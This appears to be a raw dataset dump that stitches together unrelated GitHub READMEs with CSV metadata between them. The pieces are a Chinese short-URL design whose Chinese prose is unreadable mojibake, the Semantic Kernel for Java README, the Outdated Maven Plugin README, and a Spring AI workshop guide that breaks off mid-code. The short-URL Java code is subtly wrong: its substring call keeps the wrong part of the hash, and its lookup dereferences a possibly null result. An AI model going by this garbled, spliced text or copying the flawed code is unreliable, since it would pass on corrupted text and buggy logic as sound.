åœ¨ä¼˜ç§€çš„å“ˆå¸Œå‡½æ•°ï¼Œéƒ½ä¸å¯é¿å…åœ°ä¼šäº§ç”Ÿå“ˆå¸Œå†²çªï¼ˆå°½ç®¡æ¦‚ç‡å¾ˆä½ï¼‰ï¼Œè¯¥æ€ä¹ˆè§£å†³å‘¢ã€‚æˆ‘ä»¬è®¾è®¡å¦‚ä¸‹mysqlè¡¨
```sql
CREATE TABLE `short_url` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `lurl` varchar(150) NOT NULL,
  `surl` varchar(10) NOT NULL,
  `gmt_create` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_surl` (`surl`),
  KEY `idx_lurl` (`lurl`)
) ENGINE=InnoDB AUTO_INCREMENT=15536 DEFAULT CHARSET=utf8;
```
1. è·å–é•¿urlï¼Œä½¿ç”¨murmur64è¿›è¡Œhashï¼Œå¹¶ä¸”ä½¿ç”¨Base62 encodeä¸€ä¸‹ï¼Œå–å‰6ä½
2. æ ¹æ®çŸ­é“¾å»short_urlè¡¨ä¸­æŸ¥æ‰¾çœ‹æ˜¯å¦å­˜åœ¨ç›¸å…³è®°å½•ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°†é•¿é“¾ä¸çŸ­é“¾å¯¹åº”å…³ç³»æ’å…¥æ•°æ®åº“ä¸­ï¼Œå­˜å‚¨ã€‚
3. å¦‚æœå­˜åœ¨ï¼Œåˆ™hashå†²çªäº†ã€‚æ­¤æ—¶åœ¨é•¿ä¸²ä¸Šæ‹¼æ¥ä¸€ä¸ª**éšæœºå­—æ®µ**ï¼ˆæ³¨æ„è¿™å—ä¼˜åŒ–ï¼‰ï¼Œå†æ¬¡hashå³å¯ï¼Œç›´åˆ°æ²¡æœ‰å†²çªä¸ºæ­¢ã€‚

ä»¥ä¸Šæ­¥éª¤æ˜¾ç„¶æ˜¯è¦ä¼˜åŒ–çš„ï¼Œæ’å…¥ä¸€æ¡è®°å½•å±…ç„¶è¦ç»è¿‡ä¸¤æ¬¡ sqlï¼ˆæ ¹æ®çŸ­é“¾æŸ¥è®°å½•ï¼Œå°†é•¿çŸ­é“¾å¯¹åº”å…³ç³»æ’å…¥æ•°æ®åº“ä¸­ï¼‰ï¼Œå¦‚æœåœ¨é«˜å¹¶å‘ä¸‹ï¼Œæ˜¾ç„¶ä¼šæˆä¸ºç“¶é¢ˆã€‚
1. æˆ‘ä»¬éœ€è¦ç»™çŸ­é“¾å­—æ®µ surl åŠ ä¸Šå”¯ä¸€ç´¢å¼•
2. æˆ‘ä»¬hashä¹‹åæ’å…¥æ•°æ®åº“ï¼Œå¦‚æœæ’å…¥å¤±è´¥ï¼Œè¯´æ˜è¿åäº†å”¯ä¸€æ€§ç´¢å¼•ï¼Œæ­¤æ—¶æˆ‘ä»¬é‡æ–° hash å†æ’å…¥å³å¯ï¼Œçœ‹èµ·æ¥åœ¨è¿åå”¯ä¸€æ€§ç´¢å¼•çš„æƒ…å†µä¸‹æ˜¯å¤šæ‰§è¡Œäº†æ­¥éª¤ï¼Œä½†æˆ‘ä»¬è¦çŸ¥é“ MurmurHash å‘ç”Ÿå†²çªçš„æ¦‚ç‡æ˜¯éå¸¸ä½çš„ï¼ŒåŸºæœ¬ä¸Šä¸å¤ªå¯èƒ½å‘ç”Ÿï¼Œæ‰€ä»¥è¿™ç§æ–¹æ¡ˆæ˜¯å¯ä»¥æ¥å—çš„ã€‚
3. å¦‚æœåŒä¸€ä¸ªURLï¼Œé¢‘ç¹è¯·æ±‚ï¼Œè¿™ç§ä¼šå†²çªå¤šæ¬¡ï¼Œå¯¹æ­¤æˆ‘ä»¬å¼•å…¥äº†LRU Cacheï¼Œè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨cacheé‡Œé¢ï¼Œç›´æ¥è¿”å›å³å¯ï¼Œä¸åœ¨ç”Ÿæˆä¹‹åï¼Œå†åŠ å…¥åˆ°cacheé‡Œé¢

ä¹Ÿå°±æ˜¯æ•´ä¸€ä¸ªæµç¨‹æˆ‘ä»¬åªå’Œæ•°æ®åº“æœ‰**ä¸€æ¬¡äº¤äº’**ï¼ŒåŒæ—¶æˆ‘ä»¬å¼•å…¥äº†**LRUçš„ç¼“å­˜**ï¼Œæå¤§äº†æé«˜äº†æ€§èƒ½ã€‚


## 2. å‘å·å™¨
ç»´æŠ¤ä¸€ä¸ªè‡ªå¢idï¼Œæ¯”å¦‚ 1ï¼Œ2ï¼Œ3 è¿™æ ·çš„æ•´æ•°é€’å¢ IDï¼Œå½“æ”¶åˆ°ä¸€ä¸ªé•¿é“¾è½¬çŸ­é“¾çš„è¯·æ±‚æ—¶ï¼ŒID ç”Ÿæˆå™¨ä¸ºå…¶åˆ†é…ä¸€ä¸ª IDï¼Œå†å°†å…¶è½¬åŒ–ä¸º 62 è¿›åˆ¶ï¼Œæ‹¼æ¥åˆ°çŸ­é“¾åŸŸååé¢å°±å¾—åˆ°äº†æœ€ç»ˆçš„çŸ­ç½‘å€ã€‚ä½†æ­¤æ–¹æ³•éœ€è¦å…¨å±€ç»´æŠ¤ä¸€ä¸ªè‡ªå¢idï¼ŒåŒæ—¶åŒä¸€ä¸ªé•¿çš„urlä¼šç”Ÿæˆä¸åŒçš„çŸ­çš„urlï¼Œå¹¶ä¸”çŸ­çš„urlä¼šæœ‰è§„å¾‹ï¼Œæ¯”è¾ƒå®¹æ˜“çŒœæµ‹åˆ°ã€‚

å¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§ï¼šuuidï¼Œredisè®¡æ•°ï¼ŒSnowflakeé›ªèŠ±ç®—æ³•ï¼ŒMysql è‡ªå¢ä¸»é”®ã€‚æ€»å’Œæ¯”è¾ƒæ„Ÿè§‰é›ªèŠ±ç®—æ³•ä»¥åŠredisè®¡æ•°æ¯”è¾ƒé è°±ï¼Œå¯ä»¥å°è¯•å»ä½¿ç”¨ã€‚



# Hashå‡½æ•°
æœ¬æ¬¡é€‰æ‹©çš„hashæ˜ å°„æ–¹å¼ï¼Œæ¥ç”ŸæˆçŸ­é“¾ã€‚åº•å±‚æ•°æ®å­˜å‚¨é€‰æ‹©æ˜¯mysqlï¼Œé€šè¿‡mysqlçš„åˆ†åº“åˆ†è¡¨ï¼Œè¯»å†™åˆ†ç¦»ï¼Œä¹Ÿå¯ä»¥æœ‰éå¸¸é«˜æ•ˆçš„æ•ˆç‡ã€‚å¦‚æœé‡‡ç”¨redisï¼Œç¼“å­˜ä¼šä¸¢å¤±æ•°æ®ï¼Œå¦‚æœé‡‡ç”¨hbaseï¼Œæ•ˆç‡ä¸å¯æ§ï¼Œæ•…æœ€åé€‰æ‹©mysqlä½œä¸ºåº•å±‚å­˜å‚¨æ•°æ®ã€‚

å…ˆè¯´ä¸‹hashå‡½æ•°æµ‹è¯•çš„ç»“è®ºï¼Œæ¯”è¾ƒæœ‰è¯´æœåŠ›,  å¯ä»¥ç›´æ¥çœ‹HashTestç±»
>  100Wæ•°æ®ï¼Œmurmur32ç®—æ³•(äº§ç”Ÿä¸€ä¸ª32ä½çš„hashå€¼)ï¼Œ100Wå¤§æ¦‚ä¼šæœ‰121ä¸ªå†²çª
> * i = 100000(10W), conflictSize = 1
>* i = 200000(20W), conflictSize = 6
>* i = 300000(30W), conflictSize = 12
>* i = 400000(40W), conflictSize = 19
>* i = 500000(50W), conflictSize = 32
>* i = 600000(60W), conflictSize = 46
>* i = 700000(70W), conflictSize = 54
>* i = 800000(80W), conflictSize = 76
>* i = 900000(90W), conflictSize = 94
>* i = 1000000(100W), conflictSize = 121
>
> ä¿®æ”¹ä¸º murmur64ç®—æ³•ï¼Œ100W 0å†²çªï¼Œ500W 0å†²çªï¼Œå»ºè®®ä½¿ç”¨murmur64ç®—æ³•

# ç®—æ³•å®ç°
1. ç”Ÿæˆurlæ ¸å¿ƒç®—æ³•ï¼ˆç€é‡çœ‹ä¸‹hashå†²çªè§£å†³æ–¹æ³•  && LRUçš„cacheä¹Ÿéœ€è¦å…³æ³¨ï¼‰
```java
public String generateShortUrl(String longUrl) {
	if (StringUtils.isEmpty(longUrl)) {
		throw new RuntimeException(""longUrl ä¸èƒ½ä¸ºç©º"");
	}

	String shortUrl = CacheUtils.get(MapConstants.longCache, longUrl);
	if (StringUtils.isNotEmpty(shortUrl)) {
		return shortUrl;
	}

	return getShortUrl(longUrl, getLongUrlRandom(longUrl));
}


private String getShortUrl(String rawUrl, String longUrl) {
	long hash = HashUtil.murmur64(longUrl.getBytes());
	String base62 = Base62.encode(hash + """");
	log.info(""longUrl = {}, hash = {}, base62 = {}"", longUrl, hash, base62);
	if (StringUtils.isEmpty(base62)) {
		throw new RuntimeException(""hash ç®—æ³•æœ‰è¯¯"");
	}

	String shortUrl = StringUtils.substring(base62, 6);
	ShortUrl url = new ShortUrl(rawUrl, shortUrl);
	try {
		int insert = shortUrlDAO.insert(url); // è¿™é‡Œè¿›è¡Œåˆ†åº“åˆ†è¡¨ æé«˜æ€§èƒ½
		if (insert == 1) {
			CacheUtils.put(MapConstants.longCache, rawUrl, shortUrl);
		}
	} catch (DuplicateKeyException  e) {
		// Hashå†²çª
		log.warn(""hashå†²çª è§¦å‘å”¯ä¸€ç´¢å¼• rawUrl = {}, longUrl = {}, shortUrl = {}, e = {}"", rawUrl, longUrl, shortUrl, e.getMessage(), e);
		CacheUtils.put(MapConstants.hashFailMap, rawUrl, shortUrl);
		return getShortUrl(rawUrl, getLongUrlRandom(shortUrl));
	} catch (Exception e) {
		log.error(""æœªçŸ¥é”™è¯¯ e = {}"", e.getMessage(), e);
		throw new RuntimeException(""msg = "" + e.getMessage());
	}

	return shortUrl;
}


private String getLongUrlRandom(String longUrl) {
	return longUrl + RandomUtil.randomString(6);  // è§£å†³å†²çªå¤šçš„é—®é¢˜ï¼Œéšæœºå­—ç¬¦ä¸²
}
```
2. è·å–urlæ ¸å¿ƒç®—æ³•
```java
public String getLongUrl(String shortUrl) {
	if (StringUtils.isEmpty(shortUrl)) {
		throw new RuntimeException(""shortUrl ä¸èƒ½ä¸ºç©º"");
	}

	String longUrl = CacheUtils.get(MapConstants.shortCache, shortUrl);
	if (StringUtils.isNotEmpty(longUrl)) {
		return longUrl;
	}

	LambdaQueryWrapper<ShortUrl> wrapper = new QueryWrapper<ShortUrl>().lambda().eq(ShortUrl::getSUrl, shortUrl);
	ShortUrl url = shortUrlDAO.selectOne(wrapper);
	CacheUtils.put(MapConstants.shortCache, shortUrl, url.getLUrl());
	return url.getLUrl();
}

```

å¯ä»¥çœ‹åˆ°ç”ŸæˆçŸ­é“¾åªéœ€è¦è®¿é—®ä¸€æ¬¡æ•°æ®åº“ï¼Œè·å–çŸ­é“¾ä¹Ÿåªéœ€è¦è®¿é—®ä¸€æ¬¡æ•°æ®åº“ï¼Œæ˜¯éå¸¸çš„å¿«çš„ã€‚

# ä¼˜åŒ–ç‚¹(éš¾ç‚¹ã€äº®ç‚¹)
1. ç”ŸæˆçŸ­é“¾åªéœ€è¦è®¿é—®ä¸€æ¬¡æ•°æ®åº“ã€‚è€Œä¸æ˜¯ä¼ ç»Ÿçš„å…ˆæŸ¥è¯¢ï¼Œåœ¨åˆ¤æ–­æ’å…¥ï¼Œè€Œæ˜¯ç›´æ¥æ’å…¥ï¼Œç”¨å”¯ä¸€ç´¢å¼•æ¥åˆ¤æ–­æ˜¯å¦hashå†²çª
2. åˆ©ç”¨LRUCacheï¼Œå°†æœ€è¿‘ç”Ÿæˆçš„å‡ åƒä¸ªkvæ”¾è¿›mapä¸­ï¼Œä¸€æ®µæ—¶é—´å†…ï¼ŒåŒä¸€ä¸ªé•¿urlä¼šç”Ÿæˆç›¸åŒçš„çŸ­url
3. hashå†²çªåï¼Œç»™hashå†²çªå€¼ åŠ ä¸€ä¸ªéšæœºurlï¼Œé™ä½å†²çªæ¦‚ç‡
4. é€‰æ‹©æ¯”è¾ƒä¼˜ç§€çš„murmur64 hashç®—æ³•
5. getè·å–å¸¸é“¾çš„æ—¶å€™ï¼Œåˆ©ç”¨LRUè¯†åˆ«çƒ­ç‚¹æ•°æ®ï¼Œç›´æ¥ä»mapä¸­è¯»å–ï¼Œé˜²æ­¢æ‰“æŒ‚æ•°æ®åº“

# æœ€å
æœ¬æ–‡å¯¹çŸ­é“¾è®¾è®¡æ–¹æ¡ˆä½œäº†è¯¦ç»†åœ°å‰–æï¼Œæ—¨åœ¨ç»™å¤§å®¶æä¾›å‡ ç§ä¸åŒçš„çŸ­é“¾è®¾è®¡æ€è·¯ï¼Œæ–‡ä¸­æ¶‰åŠåˆ°æŒºå¤šçš„æŠ€æœ¯ç»†èŠ‚ã€‚æ¯”å¦‚murmur64 hashç®—æ³•ï¼Œbase62ï¼ŒLRUï¼Œä»¥åŠä¸ºä»€ä¹ˆé€‰æ‹©mysqlï¼Œè€Œä¸æ˜¯redisç­‰ç­‰ã€‚æ–‡ä¸­æ²¡æœ‰å±•å¼€è®²ï¼Œå»ºè®®å¤§å®¶å›å¤´å¯ä»¥å»å†è¯¦ç»†äº†è§£ä¸€ä¸‹ï¼ŒåŒæ—¶ä¹Ÿå¸Œæœ›å¤§å®¶æœ‰ç©ºï¼Œå¯ä»¥è‡ªå·±åŠ¨æ‰‹å®ç°ä¸€å¥—çŸ­é“¾æœåŠ¡ï¼Œä¸€å®šä¼šæœ‰ä¸å°çš„æ”¶è·ã€‚

# å…¶ä»–è¯­è¨€
Goè¯­è¨€å®ç°ï¼š[short-url-go](https://github.com/7836246/short-url-go)   æ„Ÿè°¢ [Xu Kangçš„è´¡çŒ®](https://github.com/7836246)  


# Stargazers over time
[![Stargazers over time](https://starchart.cc/wenbochang888/short-url.svg?variant=adaptive)](https://starchart.cc/wenbochang888/short-url)
",0,0,3,2.0,"['http', 'stargazer', 'time']","['http', 'stargazer', 'time']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
microsoft/semantic-kernel-java,main,"[![Builds](https://github.com/microsoft/semantic-kernel-java/actions/workflows/java-build.yml/badge.svg?branch=main)](https://github.com/microsoft/semantic-kernel-java/actions/workflows/java-build.yml)
[![License: MIT](https://img.shields.io/github/license/microsoft/semantic-kernel)](https://github.com/microsoft/semantic-kernel-java/blob/main/LICENSE)
[![Discord](https://img.shields.io/discord/1063152441819942922?label=Discord&logo=discord&logoColor=white&color=d82679)](https://aka.ms/SKDiscord)

# Semantic Kernel for Java

Welcome to the Semantic Kernel for Java. For detailed documentation, visit [Microsoft Learn](https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java).

[Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/overview/) is an SDK that integrates Large Language Models (LLMs) like [OpenAI](https://platform.openai.com/docs/introduction), [Azure OpenAI](https://azure.microsoft.com/en-us/products/ai-services/openai-service), and [Hugging Face](https://huggingface.co/)
with conventional programming languages like C#, Python, and Java. Semantic Kernel achieves this by allowing you to define [plugins](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins??tabs=Java&pivots=programming-language-java) that can be chained together in just a [few lines of code](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java#using-the-runasync-method-to-simplify-your-code).

What makes Semantic Kernel _special_, however, is its ability to _automatically_ orchestrate plugins with AI. With Semantic Kernel [planners](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java), you can ask an LLM to generate a plan that achieves a user's unique goal. Afterwards, Semantic Kernel will execute the plan for the user.

For C#, Python and other language support, see [microsoft/semantic-kernel](https://github.com/microsoft/semantic-kernel).

#### Please star the repo to show your support for this project!

![Orchestrating plugins with planner](https://learn.microsoft.com/en-us/semantic-kernel/media/kernel-infographic.png)

## Getting started with Semantic Kernel for Java

The quickest way to get started with the basics is to get an API key from either OpenAI or Azure OpenAI and to run one of the Java console applications/scripts below.

1. Clone the repository: `git clone https://github.com/microsoft/semantic-kernel-java.git`
2. Follow the instructions [Start learning how to use Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/get-started/quick-start-guide?tabs=Java&pivots=programming-language-java).

## Documentation: Learning how to use Semantic Kernel

The fastest way to learn how to use Semantic Kernel is with our walkthroughs
on our Learn site.

1. ğŸ“– [Overview of the kernel](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/?tabs=Java&pivots=programming-language-java)
1. ğŸ”Œ [Understanding AI plugins](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins?tabs=Java&pivots=programming-language-java)
1. ğŸ‘„ [Creating semantic functions](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/semantic-functions?tabs=Java&pivots=programming-language-java)
1. ğŸ’½ [Creating native functions](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/native-functions?tabs=Java&pivots=programming-language-java)
1. â›“ï¸ [Chaining functions together](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java)
1. ğŸ¤– [Auto create plans with planner](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java)
1. ğŸ’¡ [Create and run a ChatGPT plugin](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chatgpt-plugins?tabs=Java&pivots=programming-language-java)

## Join the community

We welcome your contributions and suggestions to SK community! One of the easiest
ways to participate is to engage in discussions in the GitHub repository.
Bug reports and fixes are welcome!

For new features, components, or extensions, please open an issue and discuss with
us before sending a PR. This is to avoid rejection as we might be taking the core
in a different direction, but also to consider the impact on the larger ecosystem.

To learn more and get started:

- Read the [documentation](https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java)
- Learn how to [contribute](https://learn.microsoft.com/en-us/semantic-kernel/support/contributing?tabs=Java&pivots=programming-language-java) to the project
- Join the [Discord community](https://aka.ms/SKDiscord)
- Attend [regular office hours and SK community events](COMMUNITY.md)
- Follow the team on our [blog](https://aka.ms/sk/blog)

## Contributor Wall of Fame

[![semantic-kernel contributors](https://contrib.rocks/image?repo=microsoft/semantic-kernel-java)](https://github.com/microsoft/semantic-kernel-java/graphs/contributors)

## Code of Conduct

This project has adopted the
[Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the
[Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/)
or contact [opencode@microsoft.com](mailto:opencode@microsoft.com)
with any additional questions or comments.

## License

Copyright (c) Microsoft Corporation. All rights reserved.

Licensed under the [MIT](LICENSE) license.
",3,76,7,82.0,"['semantic', 'kernel', 'java', 'please', 'star', 'repo', 'show', 'support', 'project', 'get', 'start', 'semantic', 'kernel', 'java', 'documentation', 'learning', 'use', 'semantic', 'kernel', 'join', 'community', 'contributor', 'wall', 'fame', 'code', 'conduct', 'license']","['semantic', 'kernel', 'java', 'please', 'star']",22.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-assembly-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-changes-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-jxr-plugin,org.apache.maven.plugins:maven-pmd-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.rat:apache-rat-plugin,org.codehaus.mojo:animal-sniffer-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:license-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.commonjava.maven.plugins:directory-maven-plugin,org.jacoco:jacoco-maven-plugin,org.mutabilitydetector:MutabilityDetector4FindBugs]",0.0,15.0,7.0
Giovds/outdated-maven-plugin,main,"# The Outdated Maven Plugin

> Stay up-to-date and secure with The Outdated Maven Plugin!

The Outdated Maven Plugin is a tool designed to help developers identify outdated dependencies in their Maven projects.
By scanning the dependencies of your project, this plugin determines if they are no longer actively maintained
based on a user-defined threshold of inactivity in years. This ensures that your project remains up-to-date with the
latest and most secure versions of its dependencies.

## Usage

You can use the plugin as standalone for a quick check by simply running the following command in your favourite
project:\
`mvn com.giovds:outdated-maven-plugin:check -Dyears=<number_of_years>`

Or plug it into your build:

```xml

<build>
    <plugins>
        <plugin>
            <groupId>com.giovds</groupId>
            <artifactId>outdated-maven-plugin</artifactId>
            <version>1.2.0</version>
            <configuration>
                <!-- The maximum amount of inactive years allowed -->
                <years>1</years>
                <!-- Whether to fail the build if an outdated dependency is found -->
                <shouldFailBuild>false</shouldFailBuild>
            </configuration>
            <executions>
                <execution>
                    <id>outdated-check</id>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

## Contributing

Contributions are welcome! \
Please verify if a similar issue is not reported already. If it is not create one, if it is.

## License

This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
",1,7,1,14.0,"['the', 'outdated', 'maven', 'plugin', 'usage', 'contribute', 'license']","['the', 'outdated', 'maven', 'plugin', 'usage']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,0.0,0.0
danvega/spring-ai-workshop,main,"# Spring AI Workshop

This is a repository that contains all the code for my Spring AI Workshop. In this workshop we go through an introduction to AI and building intelligent applications in Java with Spring AI.

## Agenda

- **Artificial Intelligence (AI)**
  - Overview 
  - Machine Learning / Deep Learning
    - Supervised Learning
    - Unsupervised Learning
- **Large Language Models (LLMs)**
  - Models
  - API Keys
  - Tokens
  - Calling REST Endpoints
- **Spring AI**
  - Getting Started
  - Chat Client
  - Memory
  - Prompt
  - Output
  - RAG

## Artificial Intelligence (AI)

It's fair to say that the term ""AI"" is frequently used today. But what exactly is it? Artificial Intelligence is a scientific field that emerged shortly after World War 2. For quite some time, progress in this area was rather slow.

AI is a broad discipline that includes various techniques. In this workshop, we will focus on a subset of these techniques. We will begin with Machine Learning, specifically Deep Learning, which involves the use of Neural Networks. The emphasis in this field is on learning, or acquiring skills or knowledge from experience. For the purpose of our discussion, we can categorize this into supervised and unsupervised learning.

![Supervised vs Unsupervised Learning](/images/supervised_unsupervised.png)

### Supervised Learning

Supervised learning is a machine learning approach where the model is trained using a labeled dataset. In this context, every training example is associated with an output label. The aim of supervised learning is to establish a link between inputs and outputs, which can then be utilized to predict labels for new, unseen data.

As their name suggests, they 'literally' divide data points into different classes and learn the boundaries using probability estimates and maximum likelihood. Here are some use cases for supervised machine learning that you may have encountered:

- Facial Recognition
- Recognize Tumors on x-ray scans
- Abnormality on ultrasounds
- Self-driving mode (recognize stop sign / pedestrian / etc)
- Fraud detection
- Product Recommendations (YouTube)
- Spam Filtering

### Unsupervised Learning

Unsupervised learning is a type of machine learning where the model is trained on data without labeled responses. In other words, the algorithm is given a dataset with input data but without any corresponding output values. The goal of unsupervised learning is to find hidden patterns or intrinsic structures in the input data.

**Large Language Models (LLMs)** are trained on vast amounts of training data and this is powered by lots of compute power. LLMs use unsupervised or self-supervised learning during their training phase. They predict the next word in a sentence (or fill in blanks) using context from the surrounding text, learning from the structure and patterns within the data itself without explicit labels.

**Generative AI** is based on the transformer architecture which is able to take that training data and generate something brand new at the intersection of LLMs. Generative AI is a broader concept encompassing various techniques and models, including but not limited to LLMs. Generative AI is what powers applications like Open AI's GPT & Google Gemini.

![AI](/images/ai.png)

## Large Language Models (LLMs)

In this section of the workshop you will learn about how to consume Large Language Models (LLMs).

### Models

- [Open AI](https://openai.com/)
- [Google Gemini](https://ai.google.dev/gemini-api)
- [Hugging Face](https://huggingface.co/)

### Tokens 

Tokens are the currency of LLMs - OpenAI's large language models (sometimes referred to as GPT's) process text using tokens, which are common sequences of characters found in a set of text.

- https://openai.com/api/pricing/
- https://platform.openai.com/tokenizer

### AI REST Endpoints

To be able to call the Open AI REST endpoint you need to signup for an [Open AI API](https://platform.openai.com/). Once you have an API key you can call a REST endpoint using cURL or Java.

```shell
#!/bin/bash
echo ""Calling Open AI...""
MY_OPENAI_KEY=""YOUR_API_KEY_HERE""
PROMPT=""Tell me a dad joke about banks""

curl https://api.openai.com/v1/chat/completions \
-H ""Content-Type: application/json"" \
-H ""Authorization: Bearer $MY_OPENAI_KEY"" \
-d '{ ""model"": ""gpt-4o"", ""messages"": [{""role"":""user"", ""content"": ""'""${PROMPT}""'""}] }'
```

```java
public class HelloOpenAI {

    public void call() throws IOException, InterruptedException {
        var apiKey = ""YOUR_API_KEY"";
        var body = """"""
                {
                    ""model"": ""gpt-4o"",
                    ""messages"": [
                        {
                            ""role"": ""user"",
                            ""content"": ""Tell me a good dad joke about Dogs""
                        }
                    ]
                }"""""";

        var request = HttpRequest.newBuilder()
                .uri(URI.create(""https://api.openai.com/v1/chat/completions""))
                .header(""Content-Type"", ""application/json"")
                .header(""Authorization"", ""Bearer "" + apiKey)
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .build();

        var client = HttpClient.newHttpClient();
        var response = client.send(request, HttpResponse.BodyHandlers.ofString());
        System.out.println(response.body());
    }

}
```

## Spring AI

The Spring AI project aims to streamline the development of applications that incorporate artificial intelligence functionality without unnecessary complexity.

The project draws inspiration from notable Python projects, such as LangChain and LlamaIndex, but Spring AI is not a direct port of those projects. The project was founded with the belief that the next wave of Generative AI applications will not be only for Python developers but will be ubiquitous across many programming languages.

### Documentation / Getting Started 

- [Spring AI Documentation](https://docs.spring.io/spring-ai/reference/)
- [Spring Initializr](https://start.spring.io)
- Web,Open AI, DevTools
- application.properties
  - Hardcoding string
  - Environment Variables

```properties
spring.application.name=ai-workshop
spring.ai.openai.api-key=YOUR_OPEN_AI_API_KEY
spring.ai.openai.chat.options.model=gpt-4o
```

**HTTP Clients**

You will be creating a number of REST endpoints that call OpenAI's GPT-4o Model. To manually test the endpoints you will need an HTTP client. There are a number of options below, but I will be using httpie. 

- [IntelliJ](https://www.jetbrains.com/help/idea/http-client-in-product-code-editor.html) 
- [Postman](https://www.postman.com/)
- [cURL](https://curl.se/)
- [httpie](https://httpie.io/)

### Chat Client 

The ChatClient offers a fluent API for communicating with an AI Model. It supports both a synchronous and reactive programming model.

The `ChatController` demo shows off how to get an instance of the ChatClient and how to call the LLM using the fluent API. 

```java
@RestController
public class ChatController {

    private final ChatClient chatClient;

    public ChatController(ChatClient.Builder builder) {
        this.chatClient = builder
                .build();
    }

    @GetMapping(""/"")
    public String joke(@RequestParam(value = ""message"", defaultValue = ""Tell me a dad joke about Banks"") String message) {
        return chatClient.prompt()
                .user(message)
                .call()
                .content(); // short for getResult().getOutput().getContent();
    }
    
    @GetMapping(""/jokes-by-topic"")
    public String jokesByTopic(@RequestParam String topic) {
        return chatClient.prompt()
                .user(u -> u.text(""Tell me a joke about {topic}"").param(""topic"",topic))
                .call()
                .content();
    }
    
    @GetMapping(""jokes-with-response"")
    public ChatResponse jokeWithResponse(@RequestParam(value = ""message"", defaultValue = ""Tell me a dad joke about computers"") String message) {
        return chatClient.prompt()
                .user(message)
                .call()
                .chatResponse();
    }

}
```

The `StreamController` shows off an example of using the `stream()` method. The stream lets you get an asynchronous response

```java
@RestController
public class StreamController {

  private final ChatClient chatClient;

  public StreamController(ChatClient.Builder builder) {
    this.chatClient = builder
            .build();
  }

  @GetMapping(""/without-stream"")
  public String withoutStream(@RequestParam(
          value = ""message"",
          defaultValue = ""I'm visiting Toronto this week, what are 10 places I must visit?"") String message) {

    return chatClient.prompt()
            .user(message)
            .call()
            .content();
  }

  // http --stream :8080/stream
  @GetMapping(""/stream"")
  public Flux<String> stream(@RequestParam(
          value = ""message"",
          defaultValue = ""I'm visiting Toronto this week, what are 10 places I must visit?"") String message) {
    return chatClient.prompt()
            .user(message)
            .stream()
            .content();
  }

}
```

### Chat Memory

The web is stateless, and we need to remember that when working the various REST endpoints that the LLMs provide. This might be a bit confusing because you have probably used ChatGPT before, and it remembers previous conversations and can build upon them. You have to remember that ChatGPT is a product that talks to an LLM like GPT-4o and the product is what preserves conversational history. 

The interface `ChatMemory` represents a storage for chat conversation history. It provides methods to add messages to a * conversation, retrieve messages from a conversation, and clear the conversation history. There is one implementation InMemoryChatMemory that provides in-memory storage for chat conversation history.

In the following example you can use the in memory chat memory to send previous conversations along as context. 

```java
@RestController
public class StatefulController {

    private final ChatClient chatClient;

    public StatefulController(ChatClient.Builder builder) {
        this.chatClient = builder
                .defaultAdvisors(new MessageChatMemoryAdvisor(new InMemoryChatMemory()))
                .build();
    }

    @GetMapping(""/chat"")
